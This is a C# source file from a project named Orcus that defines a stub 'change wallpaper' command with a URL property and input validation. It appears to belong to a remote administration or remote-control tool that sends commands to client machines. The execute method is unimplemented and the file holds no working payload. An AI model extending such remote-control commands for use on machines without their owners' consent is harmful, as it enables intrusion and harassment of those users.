using System;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Commands.FunActions;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommands.System
{
    public class ChangeWallpaperCommand : StaticCommand
    {
        public ChangeWallpaperCommand()
        {
            this.RegisterProperty(() => DesktopWallpaperStyle,
                    Resources.StaticCommands.System_ChangeWallpaperCommand_WallpaperStyle,
                    Resources.StaticCommands.System_ChangeWallpaperCommand_WallpaperStyle_Description,
                    Resources.StaticCommands.Common)
                .RegisterProperty(() => WallpaperUrl,
                    Resources.StaticCommands.System_ChangeWallpaperCommand_WallpaperUrl,
                    Resources.StaticCommands.System_ChangeWallpaperCommand_WallpaperUrl_Description,
                    Resources.StaticCommands.Common);
        }

        public DesktopWallpaperStyle DesktopWallpaperStyle { get; set; }
        public string WallpaperUrl { get; set; }

        public override Guid CommandId { get; } = new Guid(0x7abb6c39, 0x1f32, 0xac48, 0xb6, 0xde, 0x2e, 0xe0, 0xe4,
            0x0d, 0x02, 0x61);

        public override string Name { get; } = Resources.StaticCommands.System_ChangeWallpaperCommand_Name;

        public override string Description { get; } = Resources.StaticCommands.System_ChangeWallpaperCommand_Description
            ;

        public override StaticCommandCategory Category { get; } = StaticCommandCategory.System;

        public override InputValidationResult ValidateInput()
        {
            if (WallpaperUrl.IsNullOrWhiteSpace())
                return
                    InputValidationResult.Error(
                        Resources.StaticCommands.System_ChangeWallpaperCommand_ValidateInput_WallpaperUrlCannotBeEmpty);

            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            throw new NotImplementedException();
        }
    }
}